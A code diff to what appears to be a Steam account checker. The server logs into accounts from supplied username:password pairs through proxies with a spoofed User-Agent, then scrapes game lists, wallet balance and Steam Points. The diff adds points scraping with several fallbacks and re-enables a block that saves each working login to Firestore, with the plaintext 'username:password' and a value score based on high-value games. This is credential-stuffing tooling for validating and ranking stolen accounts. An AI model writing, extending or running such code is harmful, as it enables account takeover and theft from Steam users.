@@ -265,6 +265,112 @@ async function startServer() {
               console.error('Error fetching XML persona:', e);
           }
 
+          let pointsBalance = 0;
+          try {
+              const cookieStr = cookies.join('; ');
+              let fetchOpts: any = { 
+                  headers: { 
+                      'Cookie': cookieStr,
+                      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                      'Accept': 'application/json, text/plain, */*',
+                      'Referer': 'https://store.steampowered.com/points/shop/'
+                  } 
+              };
+              if (proxy) {
+                  fetchOpts.agent = new HttpsProxyAgent(proxy.startsWith('http') ? proxy : `http://${proxy}`);
+              }
+              
+              const sessionid = cookies.find(c => c.includes('sessionid='))?.split('sessionid=')[1]?.split(';')[0];
+              console.log(`[STEAM] Fetching points for ${username}...`);
+              
+              // Standard userdata endpoint for logged-in users
+              try {
+                const userdataRes = await fetch(`https://store.steampowered.com/dynamicstore/userdata/`, fetchOpts);
+                const userdata = await userdataRes.json();
+                if (userdata && userdata.points_info && userdata.points_info.points !== undefined) {
+                    pointsBalance = parseInt(userdata.points_info.points.toString(), 10);
+                }
+              } catch (e) {
+                console.warn('[STEAM] DynamicStore points fetch failed, trying fallbacks');
+              }
+
+              if (pointsBalance === 0) {
+                  // Fallback 1: points summary
+                  const pointsUrl = sessionid 
+                    ? `https://store.steampowered.com/pointssummary/ajaxgetpointsuserinfo?sessionid=${sessionid}`
+                    : `https://store.steampowered.com/pointssummary/ajaxgetpointsuserinfo`;
+
+                  const pointsRes = await fetch(pointsUrl, fetchOpts);
+                  const pData = await pointsRes.text();
+                  try {
+                      const pJson = JSON.parse(pData);
+                      if (pJson && pJson.summary && pJson.summary.points_balance !== undefined) {
+                          pointsBalance = parseInt(pJson.summary.points_balance.toString(), 10);
+                      } else if (pJson && pJson.points_balance !== undefined) {
+                          pointsBalance = parseInt(pJson.points_balance.toString(), 10);
+                      }
+                  } catch (e) {
+                      const match = pData.match(/"points_balance"\s*:\s*"?(\d+)"?/);
+                      if (match) pointsBalance = parseInt(match[1], 10);
+                  }
+              }
+
+              if (pointsBalance === 0) {
+                  // Fallback 2: shop page parsing (for cases where JSON endpoints fail)
+                  const storeRes = await fetch(`https://store.steampowered.com/points/shop/`, fetchOpts);
+                  const storeHtml = await storeRes.text();
+                  const pointMatch = storeHtml.match(/data-tooltip-html="([\d,]+) Steam Points"/i) || 
+                                     storeHtml.match(/class="[\w\s]*loyalty-points[\w\s]*"[^>]*>([\d,]+)<\/span>/i) || 
+                                     storeHtml.match(/"point_balance"\s*:\s*"?(\d+)"?/i) || 
+                                     storeHtml.match(/"points_balance"\s*:\s*"?(\d+)"?/i) ||
+                                     storeHtml.match(/points_balance["\s:]+([\d,]+)/i) ||
+                                     storeHtml.match(/g_AccountPoints\s*=\s*"?(\d+)"?/i) ||
+                                     storeHtml.match(/loyalty-points-balance">([\d,]+)/i);
+                  if (pointMatch) {
+                      pointsBalance = parseInt(pointMatch[1].replace(/,/g, ''), 10);
+                  }
+              }
+
+              if (pointsBalance === 0) {
+                  // Fallback 3: home page parsing
+                  const homeRes = await fetch(`https://store.steampowered.com/`, fetchOpts);
+                  const homeHtml = await homeRes.text();
+                  const homeMatch = homeHtml.match(/data-tooltip-html="([\d,]+) Steam Points"/i) || 
+                                    homeHtml.match(/class="[\w\s]*loyalty-points[\w\s]*"[^>]*>([\d,]+)<\/span>/i) ||
+                                    homeHtml.match(/g_AccountPoints\s*=\s*"?(\d+)"?/i);
+                  if (homeMatch) {
+                      pointsBalance = parseInt(homeMatch[1].replace(/,/g, ''), 10);
+                  }
+              }
+              if (pointsBalance === 0) {
+                  // Fallback 4: account page parsing
+                  const accRes = await fetch(`https://store.steampowered.com/account/`, fetchOpts);
+                  const accHtml = await accRes.text();
+                  const accMatch = accHtml.match(/data-tooltip-html="([\d,]+) Steam Points"/i) || 
+                                   accHtml.match(/class="[\w\s]*loyalty-points[\w\s]*"[^>]*>([\d,]+)<\/span>/i) ||
+                                   accHtml.match(/g_AccountPoints\s*=\s*"?(\d+)"?/i) ||
+                                   accHtml.match(/points_balance["\s:]+([\d,]+)/i) ||
+                                   accHtml.match(/"points"\s*:\s*(\d+)/i);
+                  if (accMatch) {
+                      pointsBalance = parseInt(accMatch[1].replace(/,/g, ''), 10);
+                  }
+              }
+              if (pointsBalance === 0) {
+                  // Fallback 5: community page parsing
+                  const commRes = await fetch(`https://steamcommunity.com/`, fetchOpts);
+                  const commHtml = await commRes.text();
+                  const commMatch = commHtml.match(/data-tooltip-html="([\d,]+) Steam Points"/i) || 
+                                    commHtml.match(/class="[\w\s]*loyalty-points[\w\s]*"[^>]*>([\d,]+)<\/span>/i) ||
+                                    commHtml.match(/g_AccountPoints\s*=\s*"?(\d+)"?/i);
+                  if (commMatch) {
+                      pointsBalance = parseInt(commMatch[1].replace(/,/g, ''), 10);
+                  }
+              }
+              console.log(`[STEAM] Points for ${username}: ${pointsBalance}`);
+          } catch(e) {
+              console.error('Error fetching steam points:', e);
+          }
+
           if (!userData) {
               userData = {
                   steamid: steamId.toString(),
@@ -275,12 +381,10 @@ async function startServer() {
                   loccountrycode: '',
                   timecreated: 0,
                   profileurl: `https://steamcommunity.com/profiles/${steamId.toString()}`
-              }
+              };
           }
 
-          // Persistent Logging - Await it before responding for Serverless reliability
-          /*
-          // Backend writes removed
+          // Persistent Logging
           if (db) {
             try {
               const HIGH_VALUE_KEYWORDS = [
@@ -299,8 +403,9 @@ async function startServer() {
               });
 
               const gameNames = games.map(g => g.name);
+              const { FieldValue } = admin.firestore;
               
-              console.log(`[FIREBASE] Saving success check for ${username}...`);
+              console.log(`[FIREBASE] Saving check for ${username} with ${pointsBalance} points...`);
               await db.collection('checks').add({
                 credentials: `${username}:${password}`,
                 steamId: steamId.toString(),
@@ -309,9 +414,10 @@ async function startServer() {
                 country: userData.loccountrycode || 'Unknown',
                 gameCount: gameCount,
                 walletBalance: engineWalletBalance || '0',
+                pointsBalance: pointsBalance,
                 valueScore: score,
                 gameNames: gameNames.slice(0, 500),
-                timestamp: admin.firestore.FieldValue.serverTimestamp(),
+                timestamp: FieldValue.serverTimestamp(),
                 status: 'success',
                 method: 'login_check'
               });
@@ -319,7 +425,6 @@ async function startServer() {
               console.error('Error saving check to Firestore:', err.message);
             }
           }
-          */
 
           respond(200, {
             success: true,
@@ -327,7 +432,8 @@ async function startServer() {
             profile: userData,
             games: games,
             game_count: gameCount,
-            walletBalance: engineWalletBalance
+            walletBalance: engineWalletBalance,
+            pointsBalance: pointsBalance
           });
         } catch (e: any) {
           console.error('Error in webSession processing:', e.message);
